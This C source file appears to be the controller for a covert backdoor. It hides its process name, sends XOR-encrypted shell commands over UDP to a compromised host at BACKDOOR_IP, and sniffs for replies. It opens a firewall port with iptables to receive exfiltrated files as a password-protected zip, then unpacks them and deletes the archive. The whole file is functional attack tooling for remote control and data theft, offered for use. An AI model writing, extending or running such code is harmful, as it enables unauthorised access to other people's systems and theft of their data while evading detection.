#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <pthread.h>
#include <sys/prctl.h>
#include "header/udp_sender.h"
#include "header/sniffer.h"
#include "header/util.h"
#include "header/tcp_receive.h"
#include "config.h"

#define TO_INT(x) #x
#define OPEN_PORT_RULE(port) "iptables -A INPUT -p tcp --dport " TO_INT(port) " -j ACCEPT"
#define CLOSE_PORT_RULE(port) "iptables -D INPUT -p tcp --dport " TO_INT(port) " -j ACCEPT"

void *sniff_ctrl_packet(void *vargp);
void *read_user_cmd(void *vargp);
void packet_handler(char *payload, size_t payload_len);

pthread_cond_t cond = PTHREAD_COND_INITIALIZER;
pthread_mutex_t lock = PTHREAD_MUTEX_INITIALIZER;

int main(int argc, char** argv)
{
   memset(argv[0],0,strlen(argv[0]));
   strcpy(argv[0],MASK_NAME);
   prctl(PR_SET_NAME,MASK_NAME,0,0);  
   // control packet sniffing thread
   pthread_t thread_id_1, thread_id_2;
   pthread_create(&thread_id_1, NULL, sniff_ctrl_packet, NULL);
   pthread_create(&thread_id_2, NULL, read_user_cmd, NULL);
   pthread_join(thread_id_1, NULL);
   pthread_join(thread_id_2, NULL);
   return 0;
}

void *read_user_cmd(void *vargp)
{
   while (1)
   {
      fflush(stdin);
      size_t len = 0;
      char *buffer = NULL;
      size_t characters;
      printf("[CMD]: ");
      characters = getline(&buffer, &len, stdin);
      // buffer[characters - 1] = '\0';
      
      size_t payload_len = characters + strlen(HEADER_KEY);
      char payload[payload_len];
      strcpy(payload, HEADER_KEY);
      strcat(payload, buffer);
      xor_encrypt(payload, payload_len, PASSWORD);
      udp_send(BACKDOOR_IP, CMD_CHANNEL_PORT, payload, payload_len);
      pthread_mutex_lock(&lock);
      pthread_cond_wait(&cond, &lock);
      pthread_mutex_unlock(&lock);

      free(buffer);
   }
}

// UDP packet sniffing fucntion
void *sniff_ctrl_packet(void *vargp)
{
   SNIFFER_INFO info = {
      nic_name : NIC_NAME,
      filter : SNIFFER_FILTER,
   };
   sniffer_setup(&info);
   sniffer_start(info, &packet_handler);
}

void packet_handler(char *payload, size_t payload_len)
{
   xor_decrypt(payload, payload_len, PASSWORD);
   if (compare_key(payload, HEADER_KEY) < 0)
   {
      printf("auth failed\n");
      return;
   }
   // Forward to section after header key
   payload += strlen(HEADER_KEY);
   if (strncmp(payload, "[FILE/SYN]", 10) == 0)
   {
      // Forward to section after flag [FILE/SYN]
      system(OPEN_PORT_RULE(FILE_EXFILT_PORT));
      payload += 10;
      recv_file(FILE_EXFILT_PORT, EXFILT_FOLDER_PATH "temp.zip");
      system("echo y | unzip -P " PASSWORD " temp.zip > /dev/null 2>&1" );
      system("echo y | rm temp.zip > /dev/null 2>&1");
   }
   else if (strncmp(payload, "[OUTPUT]", 8) == 0)
   {
      // Forward to section after flag [OUTPUT]
      payload += 8;
      printf("%s", payload);
   }
   else if (strncmp(payload, "[FILE/FIN]", 10) == 0)
   {
      system(CLOSE_PORT_RULE(FILE_EXFILT_PORT));
   }

   pthread_cond_signal(&cond);
}